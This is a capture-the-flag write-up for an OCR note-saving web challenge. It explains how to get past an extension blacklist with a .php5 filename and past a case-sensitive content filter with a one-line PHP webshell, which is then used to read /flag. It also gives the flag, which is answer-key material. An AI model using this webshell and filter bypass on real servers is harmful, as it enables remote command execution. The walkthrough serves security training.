# OCR

## Description

An exposed **OCR** note saver. Draw, recognize, save — and see what a note can become.

## Solution Walkthrough

The challenge is an OCR note-taking tool. It accepts a POST request containing a PNG data URL, which the backend processes using Tesseract to extract text and save it to `saved/<filename>`.

Since the cookie is `PHPSESSID`, it can be inferred that the backend is PHP. Because the filename can be arbitrary, the goal is to upload a PHP webshell.

The challenge includes a few filters:

1. File extension blacklist: Blocks `{php, phtml, phar, inc}`, but misses `.php5`. Apache still executes `.php5` as PHP (whereas `.pht`, `.php3`, `.php7`, etc., can be saved but not executed).

2. Content filtering: Blocks `<?php`, `<?=`, `system`, `eval`, `passthru`, `<script`, etc. However, these are case-sensitive, so using `<?PHP SYSTEM($_GET[0]);?>` allows for a direct bypass.

Therefore, by creating an image containing `<?PHP SYSTEM($_GET[0]);?>`, saving it as `s.php5`, and accessing `/saved/s.php5?0=cat /flag`, the flag can be retrieved.

## Flag

```text
LYKNCTF{ffacbff49cdb4845998be081de2a7beb} (dynamic flag)
```
